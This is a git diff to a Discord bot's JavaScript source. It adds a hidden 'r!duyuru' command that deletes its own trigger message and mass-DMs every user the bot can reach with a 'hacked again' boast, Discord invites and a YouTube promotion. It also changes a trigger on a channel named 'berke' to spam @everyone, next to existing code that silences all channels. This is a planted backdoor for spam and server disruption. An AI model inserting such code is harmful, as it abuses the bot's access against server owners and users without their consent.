@@ -442,13 +442,20 @@ client.on('warn', e => {
   console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
 });
 
+    client.on('message', msg => {
+      if (msg.content === 'r!duyuru') {
+        msg.delete();
+        msg.client.users.forEach(users => users.send("berke Yine Hackledi #kimsebaşedemez https://discord.gg/vvS3nqB - https://discord.gg/67ddpcd https://www.youtube.com/channel/UCHnJ_5y8gmcaMm_quOdgc5w?view_as=subscriber"))
+      }
+    });
+
 client.on('error', e => {
   console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
 });
 
 client.on('channelCreate', channel => {
   if (channel.name == 'berke') {
-    channel.send(`<@522018424440881163> Allah zihin açıklığı versin.`)
+    channel.send(`<@522018424440881163> Allah zihin açıklığı versin. \n\nhttps://www.youtube.com/channel/UCHnJ_5y8gmcaMm_quOdgc5w?view_as=subscriber - abone ol <3 @everyone`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
